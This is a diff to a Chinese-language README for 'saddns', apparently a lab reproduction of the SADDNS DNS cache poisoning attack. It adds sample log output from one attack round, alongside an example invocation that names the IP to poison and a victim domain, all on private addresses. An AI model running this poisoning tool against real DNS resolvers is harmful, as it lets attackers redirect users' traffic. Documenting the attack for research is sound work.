@@ -58,6 +58,21 @@
   - `POISON_IP`: 需要投毒的IP
   - e.g. `./saddns -i 192.168.3.144 -o 192.168.3.144 -s 192.168.3.111 -u 192.168.3.135 -d vic.example.com -a 192.168.3.148 -v`
 
+- 进行一整轮攻击之后`saddns`自动停止
+  ```shell
+    [BURST] Timer fired! Triggering packet generation task.
+    [BURST] Timer fired! Triggering packet generation task.
+    [BURST] Timer fired! Triggering packet generation task.
+    [BURST] Timer fired! Triggering packet generation task.
+    Failed to make packet.
+    Packet work failed with error code: -3
+
+    [Async CB] Graceful shutdown initiated for sender.
+    [*] Event loop stopped. Cleaning up resources...
+    sender_stop: fail to stop, for not running
+    [*] Finished.
+  ```
+
 - 观察受害者递归解析器
   ```shell
     [1755165673] unbound[1828:0] debug: answer cb
